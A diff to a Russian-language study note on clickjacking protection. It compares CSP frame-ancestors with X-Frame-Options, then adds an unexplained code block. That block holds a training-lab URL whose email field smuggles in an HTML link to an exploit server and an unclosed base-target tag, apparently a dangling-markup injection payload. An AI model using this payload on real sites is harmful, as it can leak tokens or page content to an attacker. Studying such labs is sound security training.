@@ -75,3 +75,13 @@ frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
 Кроме того CSP проверяет каждый фрейм в иерархии родительских фреймов, тогда как `X-Frame-Options` проверяет только фрейм верхнего уровня.
 
 Рекомендуется использовать CSP для защиты от Clickjacking. Вы так же можете комбинировать его с заголовком `X-Frame-Optiions`, чтобы обеспечить защиту в старых браузерах, которые не поддерживают CSP, таких как Internet Explorer
+
+
+
+
+```
+
+
+https://0a460035045830eb80fd580000160083.web-security-academy.net/my-account?id=wiener&email=123<a href="https://exploit-0a9300d9046c306c80c457010174002e.exploit-server.net/exploit">Click</a><base target='
+```
+```
